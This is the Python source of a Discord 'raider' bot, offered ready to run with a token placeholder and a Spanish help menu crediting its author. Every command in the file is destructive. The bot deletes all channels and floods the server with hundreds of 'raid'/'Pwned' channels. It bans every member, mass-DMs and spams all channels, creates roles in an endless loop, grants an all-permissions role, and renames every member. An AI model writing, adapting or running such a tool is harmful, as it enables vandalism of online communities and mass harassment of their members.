import discord
import asyncio
from discord.ext.commands import *
from discord.ext import commands
from discord import Permissions
from colorama import *

#################################################################
#                                                               #
#                       WARNING                                 #
#                   code by @alexis.z40                         #
#                       Raider bot                              #
#            ・ github: https://github.com/acexe                #
#   ・ https://www.youtube.com/channel/UCKCXQGuo5Qqpna3ZjvfuUCQ #
#                                                               #
#                                                               #
#################################################################



bot = commands.Bot(command_prefix="%")
bot.remove_command('help')

TOKEN = "Aqui ingresa el TOKEN"



help_msg = ('''
=======================<< acexe >>=======================
 %raid = Destruye el servidor
 %clear {number} = nuke servidor
 %role {name} = crear rol
 %spam {number} {message} = spam en los canales
 %spamall {numer} {message} = spam en todos los canales
 %banall = banear a todos (banall)
 %dmall {messahe} = dm all
 %create {name} = crear rol administrador
 %add {@member} {@role} = Agregar rol a usuario
 %rename {name} = renombrar a todos
=======================<< acexe >>=======================
 ''')

embedVar = discord.Embed(title="acexe, By alexis.z40", color=0x00ff00)
embedVar.add_field(name="Raid cmd", value=help_msg, inline=True)



@bot.event
async def on_ready():
	
	print("========================")
	print("  acexe esta en linea !") 
	print("    by @alexis.z40    ")
	print("=========================")
	print()
	print(help_msg)

@bot.command(pass_context=True)
async def spam(ctx, num, message): 
	num2 = int(num)
	await ctx.message.delete()
	print(f"\n Spameando {num2}.... \n")
	for i in range(num2):
		await ctx.send(message)
 

@bot.command(pass_context=True)
async def role(ctx, name):
    role_place = True
    await ctx.message.delete()
    print("\n=======================")
    print("CREADNDO ROLES...")
    print("=======================\n")
    i = 0
    while role_place == True:
        i += 1
        try:
            await ctx.guild.create_role(name=name)
            print(f"[+] rol agregado, {i} hecho")
        except:
            print(f"[~] NO MAS ESPACIO DE ROL, {i} hecho")



@bot.command(pass_context=True)
async def raid(ctx):
    await ctx.message.delete()
    print("\n=======================")
    print("Eliminando canales...")
    print("=======================\n")
    i = 0
    for c in ctx.guild.channels:
    	i = i + 1
    	await c.delete()
    	print(f"[-] canal eliminado, {i} listo")	
    print("\n=======================")
    print("Creando canales...")
    print("=======================\n")
    for i in range(500):
    	guild = ctx.message.guild
    	await guild.create_text_channel("raid by acexe")
    	print(f"[+] canal creado, {i} !")
    

@bot.command(pass_context=True)
async def clear(ctx):
    await ctx.message.delete()
    print("\n=======================")
    print("Eliminando canales...")
    print("=======================\n")
    i = 0
    for c in ctx.guild.channels:
    	i = i + 1
    	await c.delete()
    	print(f"[-] Canal eliminado, {i} !")
    print("Done !")
    await ctx.guild.create_text_channel("Pwned by acexe")
    print("[-] canal creado, 1 listo")
    print("Listo !")


@bot.command(pass_context=True)
async def raid2test(ctx):
    await ctx.message.delete()
    print("\n=======================")
    print("Eliminando canales...")
    print("=======================\n")
    i = 0
    for c in ctx.guild.channels:
    	i = i + 1
    	await c.delete()
    	print(f"[-] canal eliminado, {i} !")
    print("Done !")
    print("\n=======================")
    print("creando canal...")
    print("=======================\n")
    for i in range(40):
    	guild = ctx.message.guild
    	await guild.create_text_channel("Pwned")
    	print(f"[+] canal creado, {i} !")
    print("listo !")    	
 

@bot.command(pass_context=True)
async def banall(ctx):
    await ctx.message.delete()
    num = 0
    for member in ctx.guild.members:
        try:
            await member.ban()
            print(f"[+] Banned {member}")
            num += 1
        except:
            print(f"[-] No se pudo banear {member}")
    print(f"\n[+] Parando baneos, baneados con exito {num} usuarios")

@bot.command(pass_context=True)
async def dmall(ctx, *, pub):
    num = 0
    for member in ctx.guild.members:
        try:
            await member.send(pub)
            print(f"[+] Enviar DM a {member}")
            num += 1
        except:
            print(f"[-] No se pudo enviar DM a {member}")
    print(f"\n[+] Parando de enviar dm, DMS enviados con exito a {num} usuarios")


@bot.command(pass_context=True)
async def create(ctx, name):
    await ctx.message.delete()
    await ctx.guild.create_role(name=name, mentionable=True, permissions=Permissions.all())


@bot.command(pass_context=True) 
async def add(ctx, user: discord.Member, role: discord.Role):
    await ctx.message.delete()
    await user.add_roles(role)


@bot.command(pass_context=True)
async def spamall(ctx, num, *, message):
    await ctx.message.delete()
    num = int(num)
    for a in range(num):
        for channel in ctx.guild.channels:
            await channel.send(message)

@bot.command(pass_context=True)
async def rename(ctx, *, name):
    await ctx.message.delete()
    num = 0
    for member in ctx.guild.members:
        try:
            await member.edit(nick=name)
            print(f"[+] Renombrar {member}")
            num += 1
        except:
            print(f"[-] No se pudo renombrar {member}")
    print(f"\n[+] Parando de renombrar, renombrados con exito {num} usuarios")




@bot.command(pass_context=True)
async def help(ctx):
	print(Fore.RED + "Mensaje de ayuda enviado\n" + Fore.RESET)
	await ctx.message.delete()
	await ctx.send(embed=embedVar)

bot.run(TOKEN)
